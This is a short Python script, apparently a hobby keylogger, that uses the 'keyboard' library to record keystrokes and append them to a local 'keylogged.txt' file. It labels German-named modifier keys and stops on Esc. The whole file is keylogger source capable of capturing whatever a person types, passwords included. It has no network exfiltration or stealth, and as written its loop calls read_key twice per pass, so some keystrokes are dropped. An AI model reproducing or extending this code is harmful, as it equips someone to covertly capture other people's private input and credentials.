import keyboard

commands = ["backspace", "right shift", "umschalt", "nach-oben",
        "nach-unten", "nach-rechts", "nach-links", "tab", "space",
        "feststell", "strg", "alt", "linke windows", "esc"]
typed = []

def write_file():
    global typed

    with open("..//Keylogger//keylogged.txt", 'a') as file:
        for letter in typed:
            if letter == 'enter':
                letter = 'ENTER\n'
            if letter in commands:
                letter = " " + letter.upper() + " "
            file.write(letter)

def main():
    while True:
        if keyboard.read_key() == 'esc':
            break
        else:
            key = keyboard.read_key().encode("utf-8")
            typed.append(key.decode("utf-8"))

    write_file()

if __name__ == "__main__":
    main()
